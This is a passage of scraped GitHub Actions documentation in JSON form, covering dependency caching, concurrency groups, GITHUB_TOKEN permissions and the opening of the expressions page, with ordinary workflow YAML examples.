        "content": "jobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: actions/checkout@v4  \n      - name: Make the script files executable\n        run: chmod +x my-script.sh my-other-script.sh\n      - name: Run the scripts\n        run: |\n          ./my-script.sh\n          ./my-other-script.sh"
      },
      {
        "type": "paragraph",
        "text": "For more information about therunkeyword, seeWorkflow syntax for GitHub Actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About caching workflow dependencies"
      },
      {
        "type": "paragraph",
        "text": "Workflow runs often reuse the same outputs or downloaded dependencies from one run to another. For example, package and dependency management tools such as Maven, Gradle, npm, and Yarn keep a local cache of downloaded dependencies."
      },
      {
        "type": "paragraph",
        "text": "Jobs on GitHub-hosted runners start in a clean runner image and must download dependencies each time, causing increased network utilization, longer runtime, and increased cost. To help speed up the time it takes to recreate files like dependencies, GitHub can cache files you frequently use in workflows."
      },
      {
        "type": "paragraph",
        "text": "To cache dependencies for a job, you can use GitHub'scacheaction. The action creates and restores a cache identified by a unique key. Alternatively, if you are caching the package managers listed below, using their respective setup-* actions requires minimal configuration and will create and restore dependency caches for you."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Be mindful of the following when using caching with GitHub Actions:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "We recommend that you don't store any sensitive information in the cache. For example, sensitive information can include access tokens or login credentials stored in a file in the cache path. Also, command line interface (CLI) programs likedocker logincan save access credentials in a configuration file. Anyone with read access can create a pull request on a repository and access the contents of a cache. Forks of a repository can also create pull requests on the base branch and access caches on the base branch.",
          "When using self-hosted runners, caches from workflow runs are stored on GitHub-owned cloud storage. A customer-owned storage solution is only available with GitHub Enterprise Server."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Comparing artifacts and dependency caching"
      },
      {
        "type": "paragraph",
        "text": "Artifacts and caching are similar because they provide the ability to store files on GitHub, but each feature offers different use cases and cannot be used interchangeably."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Use caching when you want to reuse files that don't change often between jobs or workflow runs, such as build dependencies from a package management system.",
          "Use artifacts when you want to save files produced by a job to view after a workflow run has ended, such as built binaries or build logs."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on workflow run artifacts, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Restrictions for accessing a cache"
      },
      {
        "type": "paragraph",
        "text": "Access restrictions provide cache isolation and security by creating a logical boundary between different branches or tags.\nWorkflow runs can restore caches created in either the current branch or the default branch (usuallymain). If a workflow run is triggered for a pull request, it can also restore caches created in the base branch, including base branches of forked repositories. For example, if the branchfeature-bhas the base branchfeature-a, a workflow run triggered on a pull request would have access to caches created in the defaultmainbranch, the basefeature-abranch, and the currentfeature-bbranch."
      },
      {
        "type": "paragraph",
        "text": "Workflow runs cannot restore caches created for child branches or sibling branches. For example, a cache created for the childfeature-bbranch would not be accessible to a workflow run triggered on the parentmainbranch. Similarly, a cache created for thefeature-abranch with the basemainwould not be accessible to its siblingfeature-cbranch with the basemain. Workflow runs also cannot restore caches created for different tag names. For example, a cache created for the tagrelease-awith the basemainwould not be accessible to a workflow run triggered for the tagrelease-bwith the basemain."
      },
      {
        "type": "paragraph",
        "text": "When a cache is created by a workflow run triggered on a pull request, the cache is created for the merge ref (refs/pull/.../merge). Because of this, the cache will have a limited scope and can only be restored by re-runs of the pull request. It cannot be restored by the base branch or other pull requests targeting that base branch."
      },
      {
        "type": "paragraph",
        "text": "Multiple workflow runs in a repository can share caches. A cache created for a branch in a workflow run can be accessed and restored from another workflow run for the same repository and branch."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using thecacheaction"
      },
      {
        "type": "paragraph",
        "text": "Thecacheactionwill attempt the following sequence when restoring a cache:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "First, it searches for an exact match to your providedkey.",
          "If no exact match is found, it will search for partial matches of thekey.",
          "If there is still no match found, and you've providedrestore-keys, these keys will be checked sequentially for partial matches. For more information, seeMatching a cache key."
        ]
      },
      {
        "type": "paragraph",
        "text": "If there is an exact match to the providedkey, this is considered a cache hit. If no cache exactly matches the providedkey, this is considered a cache miss. On a cache miss, the action automatically creates a new cache if the job completes successfully. The new cache will use thekeyyou provided and contains the files you specify inpath. For more information about how this is handled, seeCache hits and misses."
      },
      {
        "type": "paragraph",
        "text": "You cannot change the contents of an existing cache. Instead, you can create a new cache with a new key."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Input parameters for thecacheaction"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "key:RequiredThe key created when saving a cache and the key used to search for a cache. It can be any combination of variables, context values, static strings, and functions. Keys have a maximum length of 512 characters, and keys longer than the maximum length will cause the action to fail.",
          "path:RequiredThe path(s) on the runner to cache or restore.You can specify a single path, or you can add multiple paths on separate lines. For example:-name:CacheGradlepackagesuses:actions/cache@v4with:path:|\n      ~/.gradle/caches\n      ~/.gradle/wrapperYou can specify either directories or single files, and glob patterns are supported.You can specify absolute paths, or paths relative to the workspace directory.",
          "You can specify a single path, or you can add multiple paths on separate lines. For example:-name:CacheGradlepackagesuses:actions/cache@v4with:path:|\n      ~/.gradle/caches\n      ~/.gradle/wrapper",
          "You can specify either directories or single files, and glob patterns are supported.",
          "You can specify absolute paths, or paths relative to the workspace directory.",
          "restore-keys:OptionalA string containing alternative restore keys, with each restore key placed on a new line. If no cache hit occurs forkey, these restore keys are used sequentially in the order provided to find and restore a cache. For example:restore-keys:|\n  npm-feature-${{ hashFiles('package-lock.json') }}\n  npm-feature-\n  npm-",
          "enableCrossOsArchive:OptionalA boolean value that when enabled, allows Windows runners to save or restore caches independent of the operating system the cache was created on. If this parameter is not set, it defaults tofalse. For more information, seeCross OS cachein the Actions Cache documentation."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Output parameters for thecacheaction"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "cache-hit: A boolean value to indicate an exact match was found for the key."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Cache hits and misses"
      },
      {
        "type": "paragraph",
        "text": "Whenkeyexactly matches an existing cache, it's called acache hit, and the action restores the cached files to thepathdirectory."
      },
      {
        "type": "paragraph",
        "text": "Whenkeydoesn't match an existing cache, it's called acache miss, and a new cache is automatically created if the job completes successfully."
      },
      {
        "type": "paragraph",
        "text": "When a cache miss occurs, the action also searches your specifiedrestore-keysfor any matches:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "If you providerestore-keys, thecacheaction sequentially searches for any caches that match the list ofrestore-keys.When there is an exact match, the action restores the files in the cache to thepathdirectory.If there are no exact matches, the action searches for partial matches of the restore keys. When the action finds a partial match, the most recent cache is restored to thepathdirectory.",
          "When there is an exact match, the action restores the files in the cache to thepathdirectory.",
          "If there are no exact matches, the action searches for partial matches of the restore keys. When the action finds a partial match, the most recent cache is restored to thepathdirectory.",
          "Thecacheaction completes and the next step in the job runs.",
          "If the job completes successfully, the action automatically creates a new cache with the contents of thepathdirectory."
        ]
      },
      {
        "type": "paragraph",
        "text": "For a more detailed explanation of the cache matching process, seeMatching a cache key."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using thecacheaction"
      },
      {
        "type": "paragraph",
        "text": "This example creates a new cache when the packages inpackage-lock.jsonfile change, or when the runner's operating system changes. The cache key uses contexts and expressions to generate a key that includes the runner's operating system and a SHA-256 hash of thepackage-lock.jsonfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Caching with npm\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Cache node modules\n        id: cache-npm\n        uses: actions/cache@v4\n        env:\n          cache-name: cache-node-modules\n        with:\n          # npm cache files are stored in `~/.npm` on Linux/macOS\n          path: ~/.npm\n          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}\n          restore-keys: |\n            ${{ runner.os }}-build-${{ env.cache-name }}-\n            ${{ runner.os }}-build-\n            ${{ runner.os }}-\n\n      - if: ${{ steps.cache-npm.outputs.cache-hit != 'true' }}\n        name: List the state of node modules\n        continue-on-error: true\n        run: npm list\n\n      - name: Install dependencies\n        run: npm install\n\n      - name: Build\n        run: npm run build\n\n      - name: Test\n        run: npm test"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using contexts to create cache keys"
      },
      {
        "type": "paragraph",
        "text": "A cache key can include any of the contexts, functions, literals, and operators supported by GitHub Actions. For more information, seeAccessing contextual information about workflow runsandEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "Using expressions to create akeyallows you to automatically create a new cache when dependencies change."
      },
      {
        "type": "paragraph",
        "text": "For example, you can create akeyusing an expression that calculates the hash of an npmpackage-lock.jsonfile. So, when the dependencies that make up thepackage-lock.jsonfile change, the cache key changes and a new cache is automatically created."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "npm-${{ hashFiles('package-lock.json') }}"
      },
      {
        "type": "paragraph",
        "text": "GitHub evaluates the expressionhash \"package-lock.json\"to derive the finalkey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "npm-d5ea0750"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using the output of thecacheaction"
      },
      {
        "type": "paragraph",
        "text": "You can use the output of thecacheaction to do something based on whether a cache hit or miss occurred. When an exact match is found for a cache for the specifiedkey, thecache-hitoutput is set totrue."
      },
      {
        "type": "paragraph",
        "text": "In the example workflow above, there is a step that lists the state of the Node modules if a cache miss occurred:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- if: ${{ steps.cache-npm.outputs.cache-hit != 'true' }}\n  name: List the state of node modules\n  continue-on-error: true\n  run: npm list"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Matching a cache key"
      },
      {
        "type": "paragraph",
        "text": "Thecacheaction first searches for cache hits forkeyand the cacheversionin the branch containing the workflow run. If there is no hit, it searches for prefix-matches forkey, and if there is still no hit, it searches forrestore-keysand theversion. If there are still no hits in the current branch, thecacheaction retries the same steps on the default branch. Please note that the scope restrictions apply during the search. For more information, seeRestrictions for accessing a cache."
      },
      {
        "type": "paragraph",
        "text": "Cache version is a way to stamp a cache with metadata of thepathand the compression tool used while creating the cache. This ensures that the consuming workflow run uniquely matches a cache it can actually decompress and use. For more information, seeCache Versionin the Actions Cache documentation."
      },
      {
        "type": "paragraph",
        "text": "restore-keysallows you to specify a list of alternate restore keys to use when there is a cache miss onkey. You can create multiple restore keys ordered from the most specific to least specific. Thecacheaction searches therestore-keysin sequential order. When a key doesn't match directly, the action searches for keys prefixed with the restore key. If there are multiple partial matches for a restore key, the action returns the most recently created cache."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example using multiple restore keys"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "restore-keys: |\n  npm-feature-${{ hashFiles('package-lock.json') }}\n  npm-feature-\n  npm-"
      },
      {
        "type": "paragraph",
        "text": "The runner evaluates the expressions, which resolve to theserestore-keys:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "restore-keys: |\n  npm-feature-d5ea0750\n  npm-feature-\n  npm-"
      },
      {
        "type": "paragraph",
        "text": "The restore keynpm-feature-matches any key that starts with the stringnpm-feature-. For example, both of the keysnpm-feature-fd3052deandnpm-feature-a9b253ffmatch the restore key. The cache with the most recent creation date would be used. The keys in this example are searched in the following order:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "npm-feature-d5ea0750matches a specific hash.",
          "npm-feature-matches cache keys prefixed withnpm-feature-.",
          "npm-matches any keys prefixed withnpm-."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Example of search priority"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "key:\n  npm-feature-d5ea0750\nrestore-keys: |\n  npm-feature-\n  npm-"
      },
      {
        "type": "paragraph",
        "text": "For example, if a pull request contains afeaturebranch and targets the default branch (main), the action searches forkeyandrestore-keysin the following order:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Keynpm-feature-d5ea0750in thefeaturebranch",
          "Keynpm-feature-in thefeaturebranch",
          "Keynpm-in thefeaturebranch",
          "Keynpm-feature-d5ea0750in themainbranch",
          "Keynpm-feature-in themainbranch",
          "Keynpm-in themainbranch"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Usage limits and eviction policy"
      },
      {
        "type": "paragraph",
        "text": "GitHub will remove any cache entries that have not been accessed in over 7 days. There is no limit on the number of caches you can store, but the total size of all caches in a repository is limited to 10 GB. Once a repository has reached its maximum cache storage, the cache eviction policy will create space by deleting the oldest caches in the repository."
      },
      {
        "type": "paragraph",
        "text": "If you exceed the limit, GitHub will save the new cache but will begin evicting caches until the total size is less than the repository limit. The cache eviction process may cause cache thrashing, where caches are created and deleted at a high frequency. To reduce this, you can review the caches for a repository and take corrective steps, such as removing caching from specific workflows. For more information, seeManaging caches."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Managing caches"
      },
      {
        "type": "paragraph",
        "text": "To manage caches created from your workflows, you can:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "View a list of all cache entries for a repository.",
          "Filter and sort the list of caches using specific metadata such as cache size, creation time, or last accessed time.",
          "Delete cache entries from a repository.",
          "Monitor aggregate cache usage for repositories and organizations."
        ]
      },
      {
        "type": "paragraph",
        "text": "There are multiple ways to manage caches for your repositories:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using the GitHub web interface, as shown below.",
          "Using the REST API. For more information, seeREST API endpoints for GitHub Actions cache.",
          "Installing thegh cachesubcommand to manage your caches from the command line. For more information, see theGitHub CLI documentation.NoteIf you are doing this manually, ensure you have version 2.32.0 or higher of the CLI installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Viewing cache entries"
      },
      {
        "type": "paragraph",
        "text": "You can use the web interface to view a list of cache entries for a repository. In the cache list, you can see how much disk space each cache is using, when the cache was created, and when the cache was last used."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, under the \"Management\" section, clickCaches.",
          "Review the list of cache entries for the repository.To search for cache entries used for a specific branch, click theBranchdropdown menu and select a branch. The cache list will display all of the caches used for the selected branch.To search for cache entries with a specific cache key, use the syntaxkey: key-namein theFilter cachesfield. The cache list will display caches from all branches where the key was used.",
          "To search for cache entries used for a specific branch, click theBranchdropdown menu and select a branch. The cache list will display all of the caches used for the selected branch.",
          "To search for cache entries with a specific cache key, use the syntaxkey: key-namein theFilter cachesfield. The cache list will display caches from all branches where the key was used."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deleting cache entries"
      },
      {
        "type": "paragraph",
        "text": "Users withwriteaccess to a repository can use the GitHub web interface to delete cache entries."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, under the \"Management\" section, clickCaches.",
          "To the right of the cache entry you want to delete, click."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Force deleting cache entries"
      },
      {
        "type": "paragraph",
        "text": "Caches have branch scope restrictions in place, which means some caches have limited usage options. For more information on cache scope restrictions, seeRestrictions for accessing a cache, earlier in this article. If caches limited to a specific branch are using a lot of storage quota, it may cause caches from thedefaultbranch to be created and deleted at a high frequency."
      },
      {
        "type": "paragraph",
        "text": "For example, a repository could have many new pull requests opened, each with their own caches that are restricted to that branch. These caches could take up the majority of the cache storage for that repository. Once a repository has reached its maximum cache storage, the cache eviction policy will create space by deleting the oldest caches in the repository. In order to prevent cache thrashing when this happens, you can set up workflows to delete caches on a faster cadence than the cache eviction policy will. You can use the GitHub CLI to delete caches for specific branches."
      },
      {
        "type": "paragraph",
        "text": "The following example workflow usesgh cacheto delete up to 100 caches created by a branch once a pull request is closed."
      },
      {
        "type": "paragraph",
        "text": "To run the following example on cross-repository pull requests or pull requests from forks, you can trigger the workflow with thepull_request_targetevent. If you do usepull_request_targetto trigger the workflow, there are security considerations to keep in mind. For more information, seeEvents that trigger workflows."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: cleanup caches by a branch\non:\n  pull_request:\n    types:\n      - closed\n\njobs:\n  cleanup:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Cleanup\n        run: |\n          echo \"Fetching list of cache key\"\n          cacheKeysForPR=$(gh cache list --ref $BRANCH --limit 100 --json id --jq '.[].id')\n\n          ## Setting this to not fail the workflow while deleting cache keys.\n          set +e\n          echo \"Deleting caches...\"\n          for cacheKey in $cacheKeysForPR\n          do\n              gh cache delete $cacheKey\n          done\n          echo \"Done\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          GH_REPO: ${{ github.repository }}\n          BRANCH: refs/pull/${{ github.event.pull_request.number }}/merge"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can use the API to automatically list or delete all caches on your own cadence. For more information, seeREST API endpoints for GitHub Actions cache."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions allows multiple jobs within the same workflow, multiple workflow runs within the same repository, and multiple workflow runs across a repository owner's account to run concurrently. This means that multiple instances of the same workflow or job can run at the same time, performing the same steps."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions also allows you to disable concurrent execution. This can be useful for controlling your account’s or organization’s resources in situations where running multiple workflows or jobs at the same time could cause conflicts or consume more Actions minutes and storage than expected."
      },
      {
        "type": "paragraph",
        "text": "For example, the ability to run workflows concurrently means that if multiple commits are pushed to a repository in quick succession, each push could trigger a separate workflow run, and these runs will execute concurrently."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using concurrency in different scenarios"
      },
      {
        "type": "paragraph",
        "text": "You can usejobs.<job_id>.concurrencyto ensure that only a single job or workflow using the same concurrency group will run at a time. A concurrency group can be any string or expression. Allowed expression contexts:github,inputs,vars,needs,strategy, andmatrix. For more information about expressions, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "paragraph",
        "text": "You can also specifyconcurrencyat the workflow level. For more information, seeconcurrency."
      },
      {
        "type": "paragraph",
        "text": "This means that there can be at most one running and one pending job in a concurrency group at any time. When a concurrent job or workflow is queued, if another job or workflow using the same concurrency group in the repository is in progress, the queued job or workflow will bepending. Any existingpendingjob or workflow in the same concurrency group, if it exists, will be canceled and the new queued job or workflow will take its place."
      },
      {
        "type": "paragraph",
        "text": "To also cancel any currently running job or workflow in the same concurrency group, specifycancel-in-progress: true. To conditionally cancel currently running jobs or workflows in the same concurrency group, you can specifycancel-in-progressas an expression with any of the allowed expression contexts."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The concurrency group name is case insensitive. For example,prodandProdwill be treated as the same concurrency group.",
          "Ordering is not guaranteed for jobs or workflow runs using concurrency groups. Jobs or workflow runs in the same concurrency group are handled in an arbitrary order."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency and the default behavior"
      },
      {
        "type": "paragraph",
        "text": "The default behavior of GitHub Actions is to allow multiple jobs or workflow runs to run concurrently. Theconcurrencykeyword allows you to control the concurrency of workflow runs."
      },
      {
        "type": "paragraph",
        "text": "For example, you can use theconcurrencykeyword immediately after where trigger conditions are defined to limit the concurrency of entire workflow runs for a specific branch:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "You can also limit the concurrency of jobs within a workflow by using theconcurrencykeyword at the job level:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\njobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: example-group\n      cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Concurrency groups"
      },
      {
        "type": "paragraph",
        "text": "Concurrency groups provide a way to manage and limit the execution of workflow runs or jobs that share the same concurrency key."
      },
      {
        "type": "paragraph",
        "text": "Theconcurrencykey is used to group workflows or jobs together into a concurrency group. When you define aconcurrencykey, GitHub Actions ensures that only one workflow or job with that key runs at any given time. If a new workflow run or job starts with the sameconcurrencykey, GitHub Actions will cancel any workflow or job already running with that key. Theconcurrencykey can be a hard-coded string, or it can be a dynamic expression that includes context variables."
      },
      {
        "type": "paragraph",
        "text": "It is possible to define concurrency conditions in your workflow so that the workflow or job is part of a concurrency group."
      },
      {
        "type": "paragraph",
        "text": "This means that when a workflow run or job starts, GitHub will cancel any workflow runs or jobs that are already in progress in the same concurrency group. This is useful in scenarios where you want to prevent parallel runs for a certain set of a workflows or jobs, such as the ones used for deployments to a staging environment, in order to prevent actions that could cause conflicts or consume more resources than necessary."
      },
      {
        "type": "paragraph",
        "text": "In this example,job-1is part of a concurrency group namedstaging_environment. This means that if a new run ofjob-1is triggered, any runs of the same job in thestaging_environmentconcurrency group that are already in progress will be cancelled."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job-1:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: staging_environment\n      cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, using a dynamic expression such asconcurrency: ci-${{ github.ref }}in your workflow means that the workflow or job would be part of a concurrency group namedci-followed by the reference of the branch or tag that triggered the workflow. In this example, if a new commit is pushed to the main branch while a previous run is still in progress, the previous run will be cancelled and the new one will start:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using concurrency to cancel any in-progress job or run"
      },
      {
        "type": "paragraph",
        "text": "To use concurrency to cancel any in-progress job or run in GitHub Actions, you can use theconcurrencykey with thecancel-in-progressoption set totrue:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "paragraph",
        "text": "Note that in this example, without defining a particular concurrency group, GitHub Actions will cancelanyin-progress run of the job or workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Using a fallback value"
      },
      {
        "type": "paragraph",
        "text": "If you build the group name with a property that is only defined for specific events, you can use a fallback value. For example,github.head_refis only defined onpull_requestevents. If your workflow responds to other events in addition topull_requestevents, you will need to provide a fallback to avoid a syntax error. The following concurrency group cancels in-progress jobs or runs onpull_requestevents only; ifgithub.head_refis undefined, the concurrency group will fallback to the run ID, which is guaranteed to be both unique and defined for the run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs or runs for the current workflow"
      },
      {
        "type": "paragraph",
        "text": "If you have multiple workflows in the same repository, concurrency group names must be unique across workflows to avoid canceling in-progress jobs or runs from other workflows. Otherwise, any previously in-progress or pending job will be canceled, regardless of the workflow."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow, you can use thegithub.workflowproperty to build the concurrency group:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Only cancel in-progress jobs on specific branches"
      },
      {
        "type": "paragraph",
        "text": "If you would like to cancel in-progress jobs on certain branches but not on others, you can use conditional expressions withcancel-in-progress. For example, you can do this if you would like to cancel in-progress jobs on development branches but not on release branches."
      },
      {
        "type": "paragraph",
        "text": "To only cancel in-progress runs of the same workflow when not running on a release branch, you can setcancel-in-progressto an expression similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: ${{ !contains(github.ref, 'release/')}}"
      },
      {
        "type": "paragraph",
        "text": "In this example, multiple pushes to arelease/1.2.3branch would not cancel in-progress runs. Pushes to another branch, such asmain, would cancel in-progress runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Monitoring your current jobs in your organization or enterprise"
      },
      {
        "type": "paragraph",
        "text": "To identify any constraints with concurrency or queuing, you can check how many jobs are currently being processed on the GitHub-hosted runners in your organization or enterprise. For more information, seeMonitoring your current jobs."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "You can usepermissionsto modify the default permissions granted to theGITHUB_TOKEN, adding or removing access as required, so that you only allow the minimum required access. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "You can usepermissionseither as a top-level key, to apply to all jobs in the workflow, or within specific jobs. When you add thepermissionskey within a specific job, all actions and run commands within that job that use theGITHUB_TOKENgain the access rights you specify. For more information, seejobs.<job_id>.permissions."
      },
      {
        "type": "paragraph",
        "text": "For each of the available permissions, shown in the table below, you can assign one of the access levels:read(if applicable),write, ornone.writeincludesread. If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "Available permissions and details of what each allows an action to do:"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining access for theGITHUB_TOKENpermissions"
      },
      {
        "type": "paragraph",
        "text": "You can define the access that theGITHUB_TOKENwill permit by specifyingread,write, ornoneas the value of the available permissions within thepermissionskey."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  actions: read|write|none\n  attestations: read|write|none\n  checks: read|write|none\n  contents: read|write|none\n  deployments: read|write|none\n  id-token: write|none\n  issues: read|write|none\n  models: read|none\n  discussions: read|write|none\n  packages: read|write|none\n  pages: read|write|none\n  pull-requests: read|write|none\n  security-events: read|write|none\n  statuses: read|write|none"
      },
      {
        "type": "paragraph",
        "text": "If you specify the access for any of these permissions, all of those that are not specified are set tonone."
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to define one ofread-allorwrite-allaccess for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: read-all"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: write-all"
      },
      {
        "type": "paragraph",
        "text": "You can use the following syntax to disable permissions for all of the available permissions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions: {}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Changing the permissions in a forked repository"
      },
      {
        "type": "paragraph",
        "text": "You can use thepermissionskey to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected theSend write tokens to workflows from pull requestsoption in the GitHub Actions settings. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting theGITHUB_TOKENpermissions for all jobs in a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can specifypermissionsat the top level of a workflow, so that the setting applies to all jobs in the workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting theGITHUB_TOKENpermissions for an entire workflow"
      },
      {
        "type": "paragraph",
        "text": "This example shows permissions being set for theGITHUB_TOKENthat will apply to all jobs in the workflow. All permissions are granted read access."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: \"My workflow\"\n\non: [ push ]\n\npermissions: read-all\n\njobs:\n  ..."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting theGITHUB_TOKENpermissions for a specific job"
      },
      {
        "type": "paragraph",
        "text": "For a specific job, you can usejobs.<job_id>.permissionsto modify the default permissions granted to theGITHUB_TOKEN, adding or removing access as required, so that you only allow the minimum required access. For more information, seeAutomatic token authentication."
      },
      {
        "type": "paragraph",
        "text": "By specifying the permission within a job definition, you can configure a different set of permissions for theGITHUB_TOKENfor each job, if required. Alternatively, you can specify the permissions for all jobs in the workflow. For information on defining permissions at the workflow level, seepermissions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting theGITHUB_TOKENpermissions for one job in a workflow"
      },
      {
        "type": "paragraph",
        "text": "This example shows permissions being set for theGITHUB_TOKENthat will only apply to the job namedstale. Write access is granted for theissuesandpull-requestspermissions. All other permissions will have no access."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  stale:\n    runs-on: ubuntu-latest\n\n    permissions:\n      issues: write\n      pull-requests: write\n\n    steps:\n      - uses: actions/stale@v9"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About expressions"
      },
      {
        "type": "paragraph",
        "text": "You can use expressions to programmatically set environment variables in workflow files and access contexts. An expression can be any combination of literal values, references to a context, or functions. You can combine literals, context references, and functions using operators. For more information about contexts, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "Expressions are commonly used with the conditionalifkeyword in a workflow file to determine whether a step should run. When anifconditional istrue, the step will run."
      },
      {
        "type": "paragraph",
